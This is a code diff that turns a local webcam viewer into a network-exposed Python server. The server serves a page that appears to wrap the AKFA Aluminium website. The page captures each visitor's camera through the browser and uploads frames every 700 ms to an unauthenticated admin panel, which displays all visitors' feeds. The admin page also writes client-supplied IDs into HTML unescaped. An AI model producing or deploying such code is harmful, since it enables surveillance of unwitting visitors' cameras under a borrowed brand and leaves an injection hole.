@@ -1,76 +1,17 @@
-import cv2
-import time
+import base64
+import json
 import threading
+import time
+import uuid
 import webbrowser
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from urllib.parse import urlparse, parse_qs
 
-HOST = "127.0.0.1"
+HOST = "0.0.0.0"
 PORT = 8000
 
-
-class CameraManager:
-    def __init__(self, camera_index=0, width=640, height=480, fps=30):
-        self.camera_index = camera_index
-        self.width = width
-        self.height = height
-        self.fps = fps
-
-        self.cap = None
-        self.frame = None
-        self.lock = threading.Lock()
-        self.running = False
-        self.thread = None
-        self.last_read_ok = False
-
-    def start(self):
-        if self.running:
-            return
-
-        self.cap = cv2.VideoCapture(self.camera_index, cv2.CAP_DSHOW)
-
-        if not self.cap.isOpened():
-            self.cap = cv2.VideoCapture(self.camera_index)
-
-        if not self.cap.isOpened():
-            raise RuntimeError("Kamera ochilmadi")
-
-        self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, self.width)
-        self.cap.set(cv2.CAP_PROP_FRAME_HEIGHT, self.height)
-        self.cap.set(cv2.CAP_PROP_FPS, self.fps)
-        self.cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
-
-        self.running = True
-        self.thread = threading.Thread(target=self._reader, daemon=True)
-        self.thread.start()
-
-    def _reader(self):
-        while self.running:
-            ok, frame = self.cap.read()
-            self.last_read_ok = ok
-
-            if ok:
-                ret, jpeg = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
-                if ret:
-                    with self.lock:
-                        self.frame = jpeg.tobytes()
-
-            time.sleep(0.01)
-
-    def get_frame(self):
-        with self.lock:
-            return self.frame
-
-    def stop(self):
-        self.running = False
-        if self.thread and self.thread.is_alive():
-            self.thread.join(timeout=1)
-
-        if self.cap:
-            self.cap.release()
-            self.cap = None
-
-
-camera = CameraManager()
+clients = {}
+clients_lock = threading.Lock()
 
 
 INDEX_HTML = """
@@ -81,19 +22,8 @@ INDEX_HTML = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AKFA + Camera</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-        }
-
-        html, body {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background: #000;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
+        html, body { width: 100%; height: 100%; overflow: hidden; background: #000; }
 
         #siteFrame {
             position: fixed;
@@ -109,31 +39,29 @@ INDEX_HTML = """
             position: fixed;
             right: 20px;
             bottom: 20px;
-            width: 340px;
-            height: 255px;
+            width: 260px;
+            height: 180px;
             background: #000;
             border: 2px solid #fff;
             border-radius: 16px;
             overflow: hidden;
-            
-            z-index: -1;
+            z-index: 9999;
             box-shadow: 0 10px 30px rgba(0,0,0,0.35);
         }
 
-        #cameraFeed {
+        #preview {
             width: 100%;
             height: 100%;
             object-fit: cover;
             display: block;
             background: #000;
-            
         }
 
         #status {
             position: fixed;
             left: 20px;
             bottom: 20px;
-            z-index: -1;
+            z-index: 9999;
             background: rgba(0,0,0,0.75);
             color: #fff;
             padding: 10px 14px;
@@ -173,20 +101,78 @@ INDEX_HTML = """
     </div>
 
     <div id="cameraBox">
-        <img id="cameraFeed" src="/stream" alt="Camera stream">
+        <video id="preview" autoplay playsinline muted></video>
     </div>
 
-    <div id="status">Kamera faol</div>
+    <div id="status">Kamera ishga tushmoqda...</div>
+
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        const img = document.getElementById("cameraFeed");
-        const status = document.getElementById("status");
+        const statusBox = document.getElementById("status");
+        const preview = document.getElementById("preview");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
 
-        img.onload = () => {
-            status.textContent = "Kamera faol";
-        };
+        const clientId = localStorage.getItem("camera_client_id") || crypto.randomUUID();
+        localStorage.setItem("camera_client_id", clientId);
 
-        
+        let stream = null;
+        let sending = false;
+
+        async function startCamera() {
+            try {
+                statusBox.textContent = "Kamera ishga tushmoqda...";
+
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+
+                preview.srcObject = stream;
+                await preview.play();
+
+                statusBox.textContent = "Kamera faol";
+                startSendingFrames();
+            } catch (err) {
+                console.error(err);
+                statusBox.textContent = "Kamera ruxsati berilmadi yoki kamera ochilmadi";
+            }
+        }
+
+        async function sendFrame() {
+            if (!stream || preview.readyState < 2 || sending) return;
+
+            sending = true;
+            try {
+                ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
+
+                await fetch("/api/frame", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        client_id: clientId,
+                        image: dataUrl
+                    })
+                });
+            } catch (err) {
+                console.error("Frame yuborishda xatolik:", err);
+            } finally {
+                sending = false;
+            }
+        }
+
+        function startSendingFrames() {
+            sendFrame();
+            setInterval(sendFrame, 700);
+        }
+
+        window.addEventListener("load", startCamera);
     </script>
 </body>
 </html>
@@ -199,122 +185,46 @@ ADMIN_HTML = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Camera Monitor</title>
+    <title>Admin Panel</title>
     <style>
-        * {
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-
-        body {
-            margin: 0;
-            background: #0f172a;
-            color: white;
-            min-height: 100vh;
-        }
-
-        .wrap {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 24px;
-        }
-
+        * { box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { margin: 0; background: #0f172a; color: white; min-height: 100vh; }
+        .wrap { max-width: 1300px; margin: 0 auto; padding: 24px; }
         .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
+            display: flex; justify-content: space-between; align-items: center;
+            gap: 12px; margin-bottom: 20px; flex-wrap: wrap;
         }
-
-        h1 {
-            margin: 0;
-            font-size: 28px;
-        }
-
-        .actions {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-
+        h1 { margin: 0; font-size: 28px; }
         .btn {
-            text-decoration: none;
-            color: white;
-            background: #1e293b;
-            padding: 10px 14px;
-            border-radius: 10px;
-            border: 1px solid #334155;
+            text-decoration: none; color: white; background: #1e293b;
+            padding: 10px 14px; border-radius: 10px; border: 1px solid #334155;
         }
-
-        .btn:hover {
-            background: #334155;
-        }
-
+        .btn:hover { background: #334155; }
         .grid {
             display: grid;
-            grid-template-columns: 2fr 1fr;
+            grid-template-columns: repeat(auto-fit, minmax(360px, 1fr));
             gap: 20px;
         }
-
         .card {
             background: #1e293b;
             border-radius: 18px;
             padding: 18px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.25);
         }
-
-        .card h2 {
-            margin-top: 0;
-            margin-bottom: 14px;
-            font-size: 20px;
-        }
-
-        #mainFeed {
+        .card h2 { margin: 0 0 14px 0; font-size: 20px; }
+        .feed {
             width: 100%;
+            height: 260px;
+            object-fit: cover;
             border-radius: 14px;
             display: block;
             background: #000;
-            min-height: 320px;
-            object-fit: cover;
-        }
-
-        .meta {
-            display: grid;
-            gap: 12px;
-        }
-
-        .metaBox {
-            background: #0f172a;
             border: 1px solid #334155;
-            border-radius: 14px;
-            padding: 14px;
         }
-
-        .label {
-            color: #94a3b8;
-            font-size: 13px;
-            margin-bottom: 6px;
-        }
-
-        .value {
-            font-size: 18px;
-            font-weight: bold;
-        }
-
-        .ok {
-            color: #22c55e;
-        }
-
-        .warn {
-            color: #f59e0b;
-        }
-
-        @media (max-width: 900px) {
-            .grid {
-                grid-template-columns: 1fr;
-            }
+        .muted { color: #94a3b8; font-size: 14px; margin-top: 10px; }
+        .empty {
+            padding: 30px; text-align: center; border: 1px dashed #475569;
+            border-radius: 14px; color: #94a3b8;
         }
     </style>
 </head>
@@ -322,55 +232,40 @@ ADMIN_HTML = """
     <div class="wrap">
         <div class="header">
             <h1>Admin Panel</h1>
-            <div class="actions">
+            <div>
                 <a class="btn" href="/">Asosiy sahifa</a>
-                <a class="btn" href="/admin">Yangilash</a>
             </div>
         </div>
 
-        <div class="grid">
-            <div class="card">
-                <h2>Live Camera</h2>
-                <img id="mainFeed" src="/stream" alt="Live camera">
-            </div>
-
-            <div class="card">
-                <h2>Holat</h2>
-                <div class="meta">
-                    <div class="metaBox">
-                        <div class="label">Kamera</div>
-                        <div class="value ok" id="cameraStatus">Faol</div>
-                    </div>
-                    <div class="metaBox">
-                        <div class="label">Stream URL</div>
-                        <div class="value">/stream</div>
-                    </div>
-                    <div class="metaBox">
-                        <div class="label">Admin URL</div>
-                        <div class="value">/admin</div>
-                    </div>
-                    <div class="metaBox">
-                        <div class="label">Sayt</div>
-                        <div class="value">AKFA Aluminium</div>
-                    </div>
-                </div>
-            </div>
-        </div>
+        <div id="grid" class="grid"></div>
     </div>
 
     <script>
-        const feed = document.getElementById("mainFeed");
-        const cameraStatus = document.getElementById("cameraStatus");
+        async function loadClients() {
+            try {
+                const res = await fetch("/api/clients");
+                const data = await res.json();
+                const grid = document.getElementById("grid");
 
-        feed.onload = () => {
-            cameraStatus.textContent = "Faol";
-            cameraStatus.className = "value ok";
-        };
+                if (!data.clients || data.clients.length === 0) {
+                    grid.innerHTML = '<div class="empty">Hozircha aktiv kamera yo‘q</div>';
+                    return;
+                }
 
-        feed.onerror = () => {
-            cameraStatus.textContent = "Xatolik";
-            cameraStatus.className = "value warn";
-        };
+                grid.innerHTML = data.clients.map(client => `
+                    <div class="card">
+                        <h2>Client: ${client.client_id}</h2>
+                        <img class="feed" src="${client.image}" alt="camera frame" />
+                        <div class="muted">Oxirgi update: ${client.updated_at}</div>
+                    </div>
+                `).join("");
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        loadClients();
+        setInterval(loadClients, 1000);
     </script>
 </body>
 </html>
@@ -379,16 +274,29 @@ ADMIN_HTML = """
 
 class MyHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        if self.path == "/":
+        parsed = urlparse(self.path)
+
+        if parsed.path == "/":
             self._send_html(INDEX_HTML)
             return
 
-        if self.path == "/admin":
+        if parsed.path == "/admin":
             self._send_html(ADMIN_HTML)
             return
 
-        if self.path == "/stream":
-            self._send_stream()
+        if parsed.path == "/api/clients":
+            self._send_clients()
+            return
+
+        self.send_response(404)
+        self.end_headers()
+        self.wfile.write(b"404 Not Found")
+
+    def do_POST(self):
+        parsed = urlparse(self.path)
+
+        if parsed.path == "/api/frame":
+            self._receive_frame()
             return
 
         self.send_response(404)
@@ -403,62 +311,77 @@ class MyHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(data)
 
-    def _send_stream(self):
-        self.send_response(200)
-        self.send_header("Age", "0")
-        self.send_header("Cache-Control", "no-cache, private")
-        self.send_header("Pragma", "no-cache")
-        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
+    def _send_json(self, payload, code=200):
+        data = json.dumps(payload).encode("utf-8")
+        self.send_response(code)
+        self.send_header("Content-Type", "application/json; charset=utf-8")
+        self.send_header("Content-Length", str(len(data)))
+        self.send_header("Cache-Control", "no-store")
         self.end_headers()
+        self.wfile.write(data)
 
+    def _receive_frame(self):
         try:
-            while True:
-                frame = camera.get_frame()
-                if frame is None:
-                    time.sleep(0.03)
-                    continue
+            content_length = int(self.headers.get("Content-Length", "0"))
+            raw = self.rfile.read(content_length)
+            body = json.loads(raw.decode("utf-8"))
 
-                self.wfile.write(b"--frame\r\n")
-                self.wfile.write(b"Content-Type: image/jpeg\r\n")
-                self.wfile.write(f"Content-Length: {len(frame)}\r\n\r\n".encode())
-                self.wfile.write(frame)
-                self.wfile.write(b"\r\n")
-                time.sleep(1 / 30)
-        except (BrokenPipeError, ConnectionResetError):
-            pass
+            client_id = body.get("client_id")
+            image = body.get("image")
+
+            if not client_id or not image:
+                self._send_json({"ok": False, "error": "client_id yoki image yo‘q"}, 400)
+                return
+
+            with clients_lock:
+                clients[client_id] = {
+                    "client_id": client_id,
+                    "image": image,
+                    "updated_at": time.strftime("%Y-%m-%d %H:%M:%S")
+                }
+
+            self._send_json({"ok": True})
         except Exception as e:
-            print("Stream xatolik:", e)
+            self._send_json({"ok": False, "error": str(e)}, 500)
+
+    def _send_clients(self):
+        now = time.time()
+
+        with clients_lock:
+            expired = []
+            result = []
+
+            for client_id, data in clients.items():
+                result.append(data)
+
+            result.sort(key=lambda x: x["updated_at"], reverse=True)
+
+        self._send_json({"clients": result})
 
     def log_message(self, format, *args):
         return
 
 
 def open_browser():
-    webbrowser.open(f"http://{HOST}:{PORT}/")
+    try:
+        webbrowser.open(f"http://127.0.0.1:{PORT}/")
+    except Exception:
+        pass
 
 
 def run():
-    try:
-        print("Kamera ishga tushirilmoqda...")
-        camera.start()
-        print("Kamera tayyor.")
-    except Exception as e:
-        print("Kamera ochishda xatolik:", e)
-        return
+        server = ThreadingHTTPServer((HOST, PORT), MyHandler)
+        print(f"Server ishga tushdi: http://127.0.0.1:{PORT}/")
+        print(f"Admin panel: http://127.0.0.1:{PORT}/admin")
 
-    server = ThreadingHTTPServer((HOST, PORT), MyHandler)
-    print(f"Server ishga tushdi: http://{HOST}:{PORT}/")
-    print(f"Admin panel: http://{HOST}:{PORT}/admin")
+        threading.Timer(1.0, open_browser).start()
 
-    threading.Timer(1.0, open_browser).start()
-
-    try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("\\nServer to'xtatildi.")
-    finally:
-        camera.stop()
-        server.server_close()
+        try:
+            server.serve_forever()
+        except KeyboardInterrupt:
+            print("\\nServer to'xtatildi.")
+        finally:
+            server.server_close()
 
 
 if __name__ == "__main__":
